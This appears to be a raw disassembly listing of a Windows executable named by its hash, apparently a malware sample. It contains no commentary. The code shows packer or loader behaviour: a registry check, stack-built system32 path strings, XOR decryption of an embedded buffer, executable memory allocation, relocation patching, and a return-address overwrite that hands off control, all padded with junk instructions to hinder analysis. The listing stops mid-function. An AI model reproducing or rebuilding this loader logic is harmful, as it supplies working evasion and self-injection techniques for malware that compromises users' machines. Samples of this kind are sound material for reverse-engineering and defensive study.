
388f5c6d0b752be3339fae7f369809bf91fb984558c78e335ec6763562132a4b.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	call   0x401020
  401008:	pop    ebp
  401009:	ret    
  40100a:	int3   
  40100b:	int3   
  40100c:	int3   
  40100d:	int3   
  40100e:	int3   
  40100f:	int3   
  401010:	push   ebp
  401011:	mov    ebp,esp
  401013:	mov    eax,DWORD PTR [ebp+0x8]
  401016:	mov    eax,DWORD PTR [eax-0x4]
  401019:	pop    ebp
  40101a:	ret    
  40101b:	int3   
  40101c:	int3   
  40101d:	int3   
  40101e:	int3   
  40101f:	int3   
  401020:	push   ebp
  401021:	mov    ebp,esp
  401023:	call   0x4015a0
  401028:	mov    eax,ds:0x4251dc
  40102d:	push   eax
  40102e:	call   0x401010
  401033:	add    esp,0x4
  401036:	mov    ds:0x4251e0,eax
  40103b:	mov    ecx,DWORD PTR ds:0x4251e0
  401041:	push   ecx
  401042:	call   0x401a20
  401047:	add    esp,0x4
  40104a:	mov    ds:0x4251e4,eax
  40104f:	pop    ebp
  401050:	ret    
  401051:	int3   
  401052:	int3   
  401053:	int3   
  401054:	int3   
  401055:	int3   
  401056:	int3   
  401057:	int3   
  401058:	int3   
  401059:	int3   
  40105a:	int3   
  40105b:	int3   
  40105c:	int3   
  40105d:	int3   
  40105e:	int3   
  40105f:	int3   
  401060:	push   ebp
  401061:	mov    ebp,esp
  401063:	sub    esp,0x8
  401066:	mov    eax,DWORD PTR [ebp+0x8]
  401069:	cmp    DWORD PTR [eax+0x4],0x0
  40106d:	je     0x4010ab
  40106f:	mov    ecx,DWORD PTR [ebp+0x8]
  401072:	add    ecx,0x8
  401075:	mov    DWORD PTR ds:0x4251e8,ecx
  40107b:	mov    edx,DWORD PTR [ebp+0x8]
  40107e:	mov    eax,DWORD PTR [edx+0x4]
  401081:	mov    ds:0x4251ec,eax
  401086:	call   0x401530
  40108b:	mov    ecx,DWORD PTR [ebp+0x8]
  40108e:	mov    DWORD PTR ds:0x4251f0,ecx
  401094:	mov    edx,DWORD PTR [ebp+0x10]
  401097:	push   edx
  401098:	mov    eax,DWORD PTR [ebp+0xc]
  40109b:	push   eax
  40109c:	push   0x1
  40109e:	call   0x401140
  4010a3:	add    esp,0xc
  4010a6:	mov    DWORD PTR [ebp+0x8],eax
  4010a9:	jmp    0x401066
  4010ab:	mov    esp,ebp
  4010ad:	pop    ebp
  4010ae:	ret    
  4010af:	int3   
  4010b0:	push   ebp
  4010b1:	mov    ebp,esp
  4010b3:	sub    esp,0x10
  4010b6:	mov    DWORD PTR [ebp-0xc],0x425000
  4010bd:	mov    DWORD PTR [ebp-0x4],0x425070
  4010c4:	mov    eax,0x52
  4010c9:	mov    ecx,DWORD PTR [ebp-0x4]
  4010cc:	mov    WORD PTR [ecx],ax
  4010cf:	mov    edx,0x65
  4010d4:	mov    eax,DWORD PTR [ebp-0x4]
  4010d7:	mov    WORD PTR [eax+0x2],dx
  4010db:	mov    ecx,0x65
  4010e0:	mov    edx,DWORD PTR [ebp-0x4]
  4010e3:	mov    WORD PTR [edx+0xa],cx
  4010e7:	mov    eax,0x6e
  4010ec:	mov    ecx,DWORD PTR [ebp-0x4]
  4010ef:	mov    WORD PTR [ecx+0xc],ax
  4010f3:	mov    edx,0x4b
  4010f8:	mov    eax,DWORD PTR [ebp-0x4]
  4010fb:	mov    WORD PTR [eax+0xe],dx
  4010ff:	mov    ecx,DWORD PTR ds:0x425144
  401105:	mov    DWORD PTR [ebp-0x8],ecx
  401108:	lea    edx,[ebp-0x10]
  40110b:	push   edx
  40110c:	mov    eax,DWORD PTR [ebp-0xc]
  40110f:	push   eax
  401110:	push   0x80000002
  401115:	call   DWORD PTR [ebp-0x8]
  401118:	test   eax,eax
  40111a:	jne    0x401125
  40111c:	mov    eax,0x1
  401121:	jmp    0x401135
  401123:	jmp    0x401135
  401125:	push   0x1
  401127:	push   0x1
  401129:	push   0x1
  40112b:	call   0x401060
  401130:	add    esp,0xc
  401133:	xor    eax,eax
  401135:	mov    esp,ebp
  401137:	pop    ebp
  401138:	ret    
  401139:	int3   
  40113a:	int3   
  40113b:	int3   
  40113c:	int3   
  40113d:	int3   
  40113e:	int3   
  40113f:	int3   
  401140:	push   ebp
  401141:	mov    ebp,esp
  401143:	cmp    DWORD PTR [ebp+0x8],0x1
  401147:	jne    0x401151
  401149:	mov    eax,ds:0x4251f0
  40114e:	mov    DWORD PTR [ebp+0x8],eax
  401151:	mov    ecx,DWORD PTR [ebp+0x10]
  401154:	push   ecx
  401155:	mov    edx,DWORD PTR [ebp+0xc]
  401158:	push   edx
  401159:	mov    eax,DWORD PTR [ebp+0x8]
  40115c:	push   eax
  40115d:	call   0x4015d0
  401162:	add    esp,0xc
  401165:	mov    ecx,DWORD PTR [ebp+0x8]
  401168:	push   ecx
  401169:	call   0x401a10
  40116e:	add    esp,0x4
  401171:	mov    DWORD PTR [ebp+0x8],eax
  401174:	mov    eax,DWORD PTR [ebp+0x8]
  401177:	pop    ebp
  401178:	ret    
  401179:	int3   
  40117a:	int3   
  40117b:	int3   
  40117c:	int3   
  40117d:	int3   
  40117e:	int3   
  40117f:	int3   
  401180:	push   ebp
  401181:	mov    ebp,esp
  401183:	sub    esp,0x220
  401189:	mov    DWORD PTR [ebp-0x210],0x0
  401193:	mov    DWORD PTR [ebp-0x20c],0x42507c
  40119d:	mov    eax,DWORD PTR [ebp-0x20c]
  4011a3:	mov    BYTE PTR [eax+0x1],0x65
  4011a7:	mov    ecx,DWORD PTR ds:0x42512c
  4011ad:	mov    DWORD PTR ds:0x4251f4,ecx
  4011b3:	mov    edx,DWORD PTR ds:0x425130
  4011b9:	mov    DWORD PTR ds:0x4251f8,edx
  4011bf:	mov    DWORD PTR [ebp-0x218],0x0
  4011c9:	jmp    0x4011da
  4011cb:	mov    eax,DWORD PTR [ebp-0x218]
  4011d1:	add    eax,0x4
  4011d4:	mov    DWORD PTR [ebp-0x218],eax
  4011da:	mov    ecx,DWORD PTR [ebp-0x218]
  4011e0:	cmp    ecx,DWORD PTR [ebp+0xc]
  4011e3:	jae    0x401240
  4011e5:	mov    edx,DWORD PTR [ebp-0x218]
  4011eb:	add    edx,0x5b3e
  4011f1:	mov    DWORD PTR ds:0x4251fc,edx
  4011f7:	mov    eax,DWORD PTR [ebp+0x8]
  4011fa:	add    eax,DWORD PTR [ebp-0x218]
  401200:	mov    DWORD PTR [ebp-0x220],eax
  401206:	mov    ecx,DWORD PTR [ebp-0x220]
  40120c:	mov    edx,DWORD PTR [ecx]
  40120e:	add    edx,DWORD PTR [ebp-0x218]
  401214:	mov    eax,DWORD PTR [ebp-0x220]
  40121a:	mov    DWORD PTR [eax],edx
  40121c:	mov    ecx,DWORD PTR [ebp-0x220]
  401222:	mov    DWORD PTR [ebp-0x21c],ecx
  401228:	mov    edx,DWORD PTR [ebp-0x21c]
  40122e:	mov    eax,DWORD PTR [edx]
  401230:	xor    eax,DWORD PTR ds:0x4251fc
  401236:	mov    ecx,DWORD PTR [ebp-0x21c]
  40123c:	mov    DWORD PTR [ecx],eax
  40123e:	jmp    0x4011cb
  401240:	mov    esp,ebp
  401242:	pop    ebp
  401243:	ret    
  401244:	int3   
  401245:	int3   
  401246:	int3   
  401247:	int3   
  401248:	int3   
  401249:	int3   
  40124a:	int3   
  40124b:	int3   
  40124c:	int3   
  40124d:	int3   
  40124e:	int3   
  40124f:	int3   
  401250:	push   ebp
  401251:	mov    ebp,esp
  401253:	sub    esp,0x2cc
  401259:	push   ebx
  40125a:	push   esi
  40125b:	push   edi
  40125c:	mov    DWORD PTR [ebp-0x290],0x401ab0
  401266:	mov    DWORD PTR ds:0x425200,ebp
  40126c:	pusha  
  40126d:	mov    DWORD PTR [ebp-0x294],0x0
  401277:	mov    DWORD PTR [ebp-0x2a4],0x80000002
  401281:	call   0x4010b0
  401286:	test   eax,eax
  401288:	je     0x4012c2
  40128a:	call   0x401570
  40128f:	mov    eax,ds:0x4251dc
  401294:	push   eax
  401295:	call   0x401010
  40129a:	add    esp,0x4
  40129d:	mov    ds:0x4251e0,eax
  4012a2:	mov    ecx,DWORD PTR ds:0x4251e0
  4012a8:	push   ecx
  4012a9:	call   0x401a20
  4012ae:	add    esp,0x4
  4012b1:	mov    ds:0x425204,eax
  4012b6:	mov    edx,DWORD PTR ds:0x4251e0
  4012bc:	mov    DWORD PTR [ebp-0x29c],edx
  4012c2:	mov    DWORD PTR [ebp-0x288],0x64
  4012cc:	mov    DWORD PTR [ebp-0x224],0x2a
  4012d6:	mov    DWORD PTR [ebp-0x294],0x0
  4012e0:	mov    DWORD PTR [ebp-0x258],0x0
  4012ea:	mov    DWORD PTR [ebp-0x284],0x1
  4012f4:	mov    DWORD PTR [ebp-0x21c],0x0
  4012fe:	mov    eax,DWORD PTR [ebp-0x294]
  401304:	cmp    eax,DWORD PTR ds:0x4251e0
  40130a:	jae    0x401396
  401310:	mov    ecx,DWORD PTR [ebp-0x29c]
  401316:	push   ecx
  401317:	mov    edx,DWORD PTR [ebp-0x288]
  40131d:	push   edx
  40131e:	call   0x401b50
  401323:	add    esp,0x8
  401326:	mov    DWORD PTR [ebp-0x2a0],eax
  40132c:	mov    eax,DWORD PTR [ebp-0x2a0]
  401332:	push   eax
  401333:	mov    ecx,DWORD PTR ds:0x4251dc
  401339:	add    ecx,DWORD PTR [ebp-0x258]
  40133f:	push   ecx
  401340:	mov    edx,DWORD PTR ds:0x425204
  401346:	add    edx,DWORD PTR [ebp-0x294]
  40134c:	push   edx
  40134d:	call   0x401890
  401352:	add    esp,0xc
  401355:	mov    eax,DWORD PTR [ebp-0x224]
  40135b:	add    eax,DWORD PTR [ebp-0x288]
  401361:	add    eax,DWORD PTR [ebp-0x258]
  401367:	mov    DWORD PTR [ebp-0x258],eax
  40136d:	mov    ecx,DWORD PTR [ebp-0x294]
  401373:	add    ecx,DWORD PTR [ebp-0x288]
  401379:	mov    DWORD PTR [ebp-0x294],ecx
  40137f:	mov    edx,DWORD PTR [ebp-0x29c]
  401385:	sub    edx,DWORD PTR [ebp-0x2a0]
  40138b:	mov    DWORD PTR [ebp-0x29c],edx
  401391:	jmp    0x4012fe
  401396:	mov    eax,ds:0x4251e0
  40139b:	push   eax
  40139c:	mov    ecx,DWORD PTR ds:0x425204
  4013a2:	push   ecx
  4013a3:	call   0x401180
  4013a8:	add    esp,0x8
  4013ab:	mov    DWORD PTR [ebp-0x258],0x0
  4013b5:	mov    DWORD PTR [ebp-0x2c0],0x0
  4013bf:	mov    edx,DWORD PTR ds:0x4251e0
  4013c5:	push   edx
  4013c6:	push   0x0
  4013c8:	mov    eax,ds:0x4251e4
  4013cd:	push   eax
  4013ce:	call   0x401000
  4013d3:	add    esp,0xc
  4013d6:	mov    ecx,DWORD PTR ds:0x4251e0
  4013dc:	mov    DWORD PTR [ebp-0x2c8],ecx
  4013e2:	mov    edx,DWORD PTR [ebp-0x2c0]
  4013e8:	cmp    edx,DWORD PTR ds:0x4251e0
  4013ee:	jae    0x401479
  4013f4:	mov    eax,DWORD PTR [ebp-0x2c8]
  4013fa:	push   eax
  4013fb:	mov    ecx,DWORD PTR [ebp-0x288]
  401401:	push   ecx
  401402:	call   0x401b50
  401407:	add    esp,0x8
  40140a:	mov    DWORD PTR [ebp-0x2cc],eax
  401410:	mov    edx,DWORD PTR [ebp-0x2cc]
  401416:	push   edx
  401417:	mov    eax,ds:0x4251dc
  40141c:	add    eax,DWORD PTR [ebp-0x258]
  401422:	push   eax
  401423:	mov    ecx,DWORD PTR ds:0x4251e4
  401429:	add    ecx,DWORD PTR [ebp-0x2c0]
  40142f:	push   ecx
  401430:	call   0x401890
  401435:	add    esp,0xc
  401438:	mov    edx,DWORD PTR [ebp-0x224]
  40143e:	add    edx,DWORD PTR [ebp-0x288]
  401444:	add    edx,DWORD PTR [ebp-0x258]
  40144a:	mov    DWORD PTR [ebp-0x258],edx
  401450:	mov    eax,DWORD PTR [ebp-0x2c0]
  401456:	add    eax,DWORD PTR [ebp-0x288]
  40145c:	mov    DWORD PTR [ebp-0x2c0],eax
  401462:	mov    ecx,DWORD PTR [ebp-0x2c8]
  401468:	sub    ecx,DWORD PTR [ebp-0x2cc]
  40146e:	mov    DWORD PTR [ebp-0x2c8],ecx
  401474:	jmp    0x4013e2
  401479:	mov    edx,DWORD PTR ds:0x4251e0
  40147f:	push   edx
  401480:	mov    eax,ds:0x4251e4
  401485:	push   eax
  401486:	call   0x401180
  40148b:	add    esp,0x8
  40148e:	mov    DWORD PTR [ebp-0x290],0x401ab0
  401498:	mov    ecx,DWORD PTR ds:0x425204
  40149e:	mov    edx,DWORD PTR ds:0x4251e4
  4014a4:	mov    DWORD PTR [ecx],edx
  4014a6:	push   0x19000
  4014ab:	call   0x401a20
  4014b0:	add    esp,0x4
  4014b3:	mov    ds:0x425208,eax
  4014b8:	mov    eax,ds:0x425208
  4014bd:	add    eax,0x200
  4014c2:	mov    ds:0x42520c,eax
  4014c7:	push   0x17700
  4014cc:	mov    ecx,DWORD PTR ds:0x425204
  4014d2:	push   ecx
  4014d3:	mov    edx,DWORD PTR ds:0x42520c
  4014d9:	push   edx
  4014da:	call   0x401890
  4014df:	add    esp,0xc
  4014e2:	mov    eax,ds:0x425208
  4014e7:	add    eax,0x17590
  4014ec:	mov    ds:0x425210,eax
  4014f1:	popa   
  4014f2:	push   0x37
  4014f4:	mov    eax,DWORD PTR [ebp-0x290]
  4014fa:	mov    ecx,esp
  4014fc:	sub    ecx,0x22
  4014ff:	mov    edx,0x1e
  401504:	mov    DWORD PTR [ecx+edx*1+0x4],eax
  401508:	ret    
  401509:	xor    eax,eax
  40150b:	pop    edi
  40150c:	pop    esi
  40150d:	pop    ebx
  40150e:	mov    esp,ebp
  401510:	pop    ebp
  401511:	ret    
  401512:	int3   
  401513:	int3   
  401514:	int3   
  401515:	int3   
  401516:	int3   
  401517:	int3   
  401518:	int3   
  401519:	int3   
  40151a:	int3   
  40151b:	int3   
  40151c:	int3   
  40151d:	int3   
  40151e:	int3   
  40151f:	int3   
  401520:	push   ebp
  401521:	mov    ebp,esp
  401523:	call   0x401250
  401528:	pop    ebp
  401529:	ret    
  40152a:	int3   
  40152b:	int3   
  40152c:	int3   
  40152d:	int3   
  40152e:	int3   
  40152f:	int3   
  401530:	push   ebp
  401531:	mov    ebp,esp
  401533:	mov    eax,ds:0x4251ec
  401538:	sub    eax,0x8
  40153b:	shr    eax,1
  40153d:	mov    ds:0x4251ec,eax
  401542:	pop    ebp
  401543:	ret    
  401544:	int3   
  401545:	int3   
  401546:	int3   
  401547:	int3   
  401548:	int3   
  401549:	int3   
  40154a:	int3   
  40154b:	int3   
  40154c:	int3   
  40154d:	int3   
  40154e:	int3   
  40154f:	int3   
  401550:	push   ebp
  401551:	mov    ebp,esp
  401553:	pop    ebp
  401554:	ret    0x10
  401557:	int3   
  401558:	int3   
  401559:	int3   
  40155a:	int3   
  40155b:	int3   
  40155c:	int3   
  40155d:	int3   
  40155e:	int3   
  40155f:	int3   
  401560:	push   ebp
  401561:	mov    ebp,esp
  401563:	pop    ebp
  401564:	ret    0x10
  401567:	int3   
  401568:	int3   
  401569:	int3   
  40156a:	int3   
  40156b:	int3   
  40156c:	int3   
  40156d:	int3   
  40156e:	int3   
  40156f:	int3   
  401570:	push   ebp
  401571:	mov    ebp,esp
  401573:	sub    esp,0x10
  401576:	mov    DWORD PTR [ebp-0x10],0x4031ee
  40157d:	mov    DWORD PTR [ebp-0x4],0x4
  401584:	mov    eax,DWORD PTR [ebp-0x10]
  401587:	add    eax,DWORD PTR [ebp-0x4]
  40158a:	mov    DWORD PTR [ebp-0xc],eax
  40158d:	mov    ecx,DWORD PTR [ebp-0xc]
  401590:	mov    DWORD PTR [ebp-0x8],ecx
  401593:	mov    edx,DWORD PTR [ebp-0x8]
  401596:	mov    DWORD PTR ds:0x4251dc,edx
  40159c:	mov    esp,ebp
  40159e:	pop    ebp
  40159f:	ret    
  4015a0:	push   ebp
  4015a1:	mov    ebp,esp
  4015a3:	sub    esp,0x8
  4015a6:	mov    DWORD PTR [ebp-0x4],0x4
  4015ad:	mov    eax,DWORD PTR [ebp-0x4]
  4015b0:	add    eax,0x402f18
  4015b5:	mov    ds:0x4251dc,eax
  4015ba:	mov    ecx,DWORD PTR ds:0x425148
  4015c0:	mov    DWORD PTR [ebp-0x8],ecx
  4015c3:	mov    esp,ebp
  4015c5:	pop    ebp
  4015c6:	ret    
  4015c7:	int3   
  4015c8:	int3   
  4015c9:	int3   
  4015ca:	int3   
  4015cb:	int3   
  4015cc:	int3   
  4015cd:	int3   
  4015ce:	int3   
  4015cf:	int3   
  4015d0:	push   ebp
  4015d1:	mov    ebp,esp
  4015d3:	sub    esp,0x8
  4015d6:	mov    DWORD PTR [ebp-0x4],0x8984bc
  4015dd:	mov    DWORD PTR [ebp-0x4],0x8984bc
  4015e4:	mov    DWORD PTR [ebp-0x4],0x8984bc
  4015eb:	mov    DWORD PTR [ebp-0x4],0x8984bc
  4015f2:	mov    DWORD PTR [ebp-0x4],0x8984bc
  4015f9:	mov    DWORD PTR [ebp-0x4],0x8984bc
  401600:	mov    DWORD PTR [ebp-0x4],0x8984bc
  401607:	mov    DWORD PTR [ebp-0x4],0x8984bc
  40160e:	mov    DWORD PTR [ebp-0x4],0x8984bc
  401615:	mov    DWORD PTR [ebp-0x4],0x8984bc
  40161c:	mov    DWORD PTR [ebp-0x4],0x8984bc
  401623:	mov    DWORD PTR [ebp-0x4],0x8984bc
  40162a:	mov    DWORD PTR [ebp-0x4],0x8984bc
  401631:	mov    DWORD PTR [ebp-0x4],0x8984bc
  401638:	mov    DWORD PTR [ebp-0x4],0x8984bc
  40163f:	mov    DWORD PTR [ebp-0x4],0x8984bc
  401646:	mov    DWORD PTR [ebp-0x4],0x8984bc
  40164d:	mov    DWORD PTR [ebp-0x4],0x8984bc
  401654:	mov    DWORD PTR [ebp-0x4],0x8984bc
  40165b:	mov    DWORD PTR [ebp-0x4],0x8984bc
  401662:	mov    DWORD PTR [ebp-0x4],0x8984bc
  401669:	mov    DWORD PTR [ebp-0x4],0x8984bc
  401670:	mov    DWORD PTR [ebp-0x4],0x8984bc
  401677:	mov    DWORD PTR [ebp-0x4],0x8984bc
  40167e:	mov    DWORD PTR [ebp-0x4],0x8984bc
  401685:	mov    DWORD PTR [ebp-0x4],0x8984bc
  40168c:	mov    DWORD PTR [ebp-0x4],0x8984bc
  401693:	mov    DWORD PTR [ebp-0x4],0x8984bc
  40169a:	mov    DWORD PTR [ebp-0x4],0x8984bc
  4016a1:	mov    DWORD PTR [ebp-0x4],0x8984bc
  4016a8:	mov    DWORD PTR [ebp-0x4],0x8984bc
  4016af:	mov    DWORD PTR [ebp-0x4],0x8984bc
  4016b6:	mov    DWORD PTR [ebp-0x4],0x8984bc
  4016bd:	mov    DWORD PTR [ebp-0x4],0x8984bc
  4016c4:	mov    DWORD PTR [ebp-0x4],0x8984bc
  4016cb:	mov    DWORD PTR [ebp-0x4],0x8984bc
  4016d2:	mov    DWORD PTR [ebp-0x4],0x8984bc
  4016d9:	mov    DWORD PTR [ebp-0x4],0x8984bc
  4016e0:	mov    DWORD PTR [ebp-0x4],0x8984bc
  4016e7:	mov    DWORD PTR [ebp-0x4],0x8984bc
  4016ee:	mov    DWORD PTR [ebp-0x4],0x8984bc
  4016f5:	mov    DWORD PTR [ebp-0x4],0x8984bc
  4016fc:	mov    DWORD PTR [ebp-0x4],0x8984bc
  401703:	mov    DWORD PTR [ebp-0x4],0x8984bc
  40170a:	mov    DWORD PTR [ebp-0x4],0x8984bc
  401711:	mov    DWORD PTR [ebp-0x4],0x8984bc
  401718:	mov    DWORD PTR [ebp-0x4],0x8984bc
  40171f:	mov    DWORD PTR [ebp-0x4],0x8984bc
  401726:	mov    DWORD PTR [ebp-0x4],0x8984bc
  40172d:	mov    DWORD PTR [ebp-0x4],0x8984bc
  401734:	mov    DWORD PTR [ebp-0x4],0x8984bc
  40173b:	mov    DWORD PTR [ebp-0x4],0x8984bc
  401742:	mov    DWORD PTR [ebp-0x4],0x8984bc
  401749:	mov    DWORD PTR [ebp-0x4],0x8984bc
  401750:	mov    DWORD PTR [ebp-0x4],0x8984bc
  401757:	mov    DWORD PTR [ebp-0x4],0x8984bc
  40175e:	mov    DWORD PTR [ebp-0x4],0x8984bc
  401765:	mov    DWORD PTR [ebp-0x4],0x8984bc
  40176c:	mov    DWORD PTR [ebp-0x4],0x8984bc
  401773:	mov    DWORD PTR [ebp-0x4],0x8984bc
  40177a:	mov    DWORD PTR [ebp-0x4],0x8984bc
  401781:	mov    DWORD PTR [ebp-0x4],0x8984bc
  401788:	mov    DWORD PTR [ebp-0x4],0x8984bc
  40178f:	mov    DWORD PTR [ebp-0x4],0x8984bc
  401796:	mov    DWORD PTR [ebp-0x4],0x8984bc
  40179d:	mov    DWORD PTR [ebp-0x4],0x8984bc
  4017a4:	mov    DWORD PTR [ebp-0x4],0x8984bc
  4017ab:	mov    DWORD PTR [ebp-0x4],0x8984bc
  4017b2:	mov    DWORD PTR [ebp-0x4],0x8984bc
  4017b9:	mov    DWORD PTR [ebp-0x4],0x8984bc
  4017c0:	mov    DWORD PTR [ebp-0x4],0x8984bc
  4017c7:	mov    DWORD PTR [ebp-0x4],0x8984bc
  4017ce:	mov    DWORD PTR [ebp-0x4],0x8984bc
  4017d5:	mov    DWORD PTR [ebp-0x4],0x8984bc
  4017dc:	mov    DWORD PTR [ebp-0x4],0x8984bc
  4017e3:	mov    DWORD PTR [ebp-0x4],0x8984bc
  4017ea:	mov    DWORD PTR [ebp-0x4],0x8984bc
  4017f1:	mov    DWORD PTR [ebp-0x4],0x8984bc
  4017f8:	mov    DWORD PTR [ebp-0x4],0x8984bc
  4017ff:	mov    DWORD PTR [ebp-0x4],0x0
  401806:	jmp    0x401811
  401808:	mov    eax,DWORD PTR [ebp-0x4]
  40180b:	add    eax,0x1
  40180e:	mov    DWORD PTR [ebp-0x4],eax
  401811:	mov    ecx,DWORD PTR [ebp-0x4]
  401814:	cmp    ecx,DWORD PTR ds:0x4251ec
  40181a:	jae    0x40187f
  40181c:	mov    edx,DWORD PTR [ebp-0x4]
  40181f:	push   edx
  401820:	mov    eax,ds:0x4251e8
  401825:	push   eax
  401826:	call   0x401af0
  40182b:	add    esp,0x8
  40182e:	sar    eax,0xc
  401831:	cmp    eax,0x3
  401834:	jne    0x40187d
  401836:	mov    ecx,DWORD PTR [ebp-0x4]
  401839:	push   ecx
  40183a:	mov    edx,DWORD PTR ds:0x4251e8
  401840:	push   edx
  401841:	call   0x401af0
  401846:	add    esp,0x8
  401849:	and    eax,0xfff
  40184e:	add    eax,0x5d6fc8
  401853:	mov    DWORD PTR [ebp-0x8],eax
  401856:	mov    eax,DWORD PTR [ebp+0x8]
  401859:	mov    ecx,DWORD PTR [ebp+0xc]
  40185c:	add    ecx,DWORD PTR [eax]
  40185e:	mov    edx,DWORD PTR [ebp-0x8]
  401861:	mov    eax,DWORD PTR [ecx+edx*1-0x5d6fc8]
  401868:	add    eax,DWORD PTR [ebp+0x10]
  40186b:	mov    ecx,DWORD PTR [ebp+0x8]
  40186e:	mov    edx,DWORD PTR [ebp+0xc]
  401871:	add    edx,DWORD PTR [ecx]
  401873:	mov    ecx,DWORD PTR [ebp-0x8]
  401876:	mov    DWORD PTR [edx+ecx*1-0x5d6fc8],eax
  40187d:	jmp    0x401808
  40187f:	mov    esp,ebp
  401881:	pop    ebp
  401882:	ret    
  401883:	int3   
  401884:	int3   
  401885:	int3   
  401886:	int3   
  401887:	int3   
  401888:	int3   
  401889:	int3   
  40188a:	int3   
  40188b:	int3   
  40188c:	int3   
  40188d:	int3   
  40188e:	int3   
  40188f:	int3   
  401890:	push   ebp
  401891:	mov    ebp,esp
  401893:	sub    esp,0x214
  401899:	push   0x104
  40189e:	lea    eax,[ebp-0x208]
  4018a4:	push   eax
  4018a5:	call   DWORD PTR ds:0x425214
  4018ab:	mov    DWORD PTR [ebp-0x210],0x0
  4018b5:	jmp    0x4018c6
  4018b7:	mov    ecx,DWORD PTR [ebp-0x210]
  4018bd:	add    ecx,0x1
  4018c0:	mov    DWORD PTR [ebp-0x210],ecx
  4018c6:	mov    edx,DWORD PTR [ebp-0x210]
  4018cc:	cmp    edx,DWORD PTR [ebp+0x10]
  4018cf:	jge    0x4019c8
  4018d5:	cmp    DWORD PTR [ebp-0x210],0x0
  4018dc:	jne    0x4019ad
  4018e2:	mov    DWORD PTR [ebp-0x214],0x4250a0
  4018ec:	mov    eax,0x5c
  4018f1:	mov    ecx,DWORD PTR [ebp-0x214]
  4018f7:	mov    WORD PTR [ecx],ax
  4018fa:	mov    edx,0x65
  4018ff:	mov    eax,DWORD PTR [ebp-0x214]
  401905:	mov    WORD PTR [eax+0xa],dx
  401909:	mov    ecx,0x6d
  40190e:	mov    edx,DWORD PTR [ebp-0x214]
  401914:	mov    WORD PTR [edx+0xc],cx
  401918:	mov    eax,0x33
  40191d:	mov    ecx,DWORD PTR [ebp-0x214]
  401923:	mov    WORD PTR [ecx+0xe],ax
  401927:	mov    edx,0x32
  40192c:	mov    eax,DWORD PTR [ebp-0x214]
  401932:	mov    WORD PTR [eax+0x10],dx
  401936:	mov    ecx,0x5c
  40193b:	mov    edx,DWORD PTR [ebp-0x214]
  401941:	mov    WORD PTR [edx+0x12],cx
  401945:	mov    eax,0x73
  40194a:	mov    ecx,DWORD PTR [ebp-0x214]
  401950:	mov    WORD PTR [ecx+0x16],ax
  401954:	mov    edx,0x65
  401959:	mov    eax,DWORD PTR [ebp-0x214]
  40195f:	mov    WORD PTR [eax+0x24],dx
  401963:	mov    ecx,DWORD PTR [ebp-0x214]
  401969:	push   ecx
  40196a:	lea    edx,[ebp-0x208]
  401970:	push   edx
  401971:	call   DWORD PTR ds:0x4251f4
  401977:	push   0x0
  401979:	push   0x80
  40197e:	push   0x3
  401980:	push   0x0
  401982:	push   0x3
  401984:	push   0x1
  401986:	lea    eax,[ebp-0x208]
  40198c:	push   eax
  40198d:	call   DWORD PTR ds:0x4251f8
  401993:	mov    DWORD PTR [ebp-0x20c],eax
  401999:	cmp    DWORD PTR [ebp-0x20c],0xffffffff
  4019a0:	je     0x4019ab
  4019a2:	cmp    DWORD PTR [ebp-0x20c],0x0
  4019a9:	jne    0x4019ad
  4019ab:	jmp    0x401a02
  4019ad:	mov    ecx,DWORD PTR [ebp+0x8]
  4019b0:	add    ecx,DWORD PTR [ebp-0x210]
  4019b6:	mov    edx,DWORD PTR [ebp+0xc]
  4019b9:	add    edx,DWORD PTR [ebp-0x210]
  4019bf:	mov    al,BYTE PTR [edx]
  4019c1:	mov    BYTE PTR [ecx],al
  4019c3:	jmp    0x4018b7
  4019c8:	mov    ecx,DWORD PTR [ebp+0x8]
  4019cb:	cmp    ecx,DWORD PTR ds:0x42520c
  4019d1:	jne    0x4019f5
  4019d3:	mov    edx,DWORD PTR ds:0x425208
  4019d9:	sub    edx,0x400000
  4019df:	push   edx
  4019e0:	mov    eax,ds:0x425208
  4019e5:	push   eax
  4019e6:	mov    ecx,DWORD PTR ds:0x4251e4
  4019ec:	push   ecx
  4019ed:	call   0x401060
  4019f2:	add    esp,0xc
  4019f5:	mov    edx,DWORD PTR [ebp-0x20c]
  4019fb:	push   edx
  4019fc:	call   DWORD PTR ds:0x425134
  401a02:	mov    esp,ebp
  401a04:	pop    ebp
  401a05:	ret    
  401a06:	int3   
  401a07:	int3   
  401a08:	int3   
  401a09:	int3   
  401a0a:	int3   
  401a0b:	int3   
  401a0c:	int3   
  401a0d:	int3   
  401a0e:	int3   
  401a0f:	int3   
  401a10:	push   ebp
  401a11:	mov    ebp,esp
  401a13:	mov    eax,DWORD PTR [ebp+0x8]
  401a16:	mov    ecx,DWORD PTR [ebp+0x8]
  401a19:	add    ecx,DWORD PTR [eax+0x4]
  401a1c:	mov    eax,ecx
  401a1e:	pop    ebp
  401a1f:	ret    
  401a20:	push   ebp
  401a21:	mov    ebp,esp
  401a23:	sub    esp,0x220
  401a29:	mov    DWORD PTR [ebp-0x8],0x215
  401a30:	mov    DWORD PTR [ebp-0x220],0x3000
  401a3a:	mov    DWORD PTR [ebp-0x4],0x40
  401a41:	mov    DWORD PTR [ebp-0x214],0x0
  401a4b:	mov    DWORD PTR [ebp-0x218],0x0
  401a55:	mov    eax,ds:0x425138
  401a5a:	mov    ds:0x425214,eax
  401a5f:	push   0x104
  401a64:	lea    ecx,[ebp-0x210]
  401a6a:	push   ecx
  401a6b:	call   DWORD PTR ds:0x425214
  401a71:	mov    edx,DWORD PTR ds:0x42512c
  401a77:	mov    DWORD PTR ds:0x4251f4,edx
  401a7d:	mov    eax,ds:0x425130
  401a82:	mov    ds:0x4251f8,eax
  401a87:	mov    ecx,DWORD PTR [ebp-0x4]
  401a8a:	push   ecx
  401a8b:	mov    edx,DWORD PTR [ebp-0x220]
  401a91:	push   edx
  401a92:	mov    eax,DWORD PTR [ebp+0x8]
  401a95:	push   eax
  401a96:	mov    ecx,DWORD PTR [ebp-0x214]
  401a9c:	push   ecx
  401a9d:	push   0xffffffff
  401a9f:	call   DWORD PTR ds:0x42513c
  401aa5:	mov    esp,ebp
  401aa7:	pop    ebp
  401aa8:	ret    
  401aa9:	int3   
  401aaa:	int3   
  401aab:	int3   
  401aac:	int3   
  401aad:	int3   
  401aae:	int3   
  401aaf:	int3   
  401ab0:	push   ebp
  401ab1:	mov    ebp,esp
  401ab3:	push   ecx
  401ab4:	mov    DWORD PTR [ebp-0x4],0x5e3d
  401abb:	mov    ecx,ecx
  401abd:	mov    ecx,ecx
  401abf:	mov    ecx,ecx
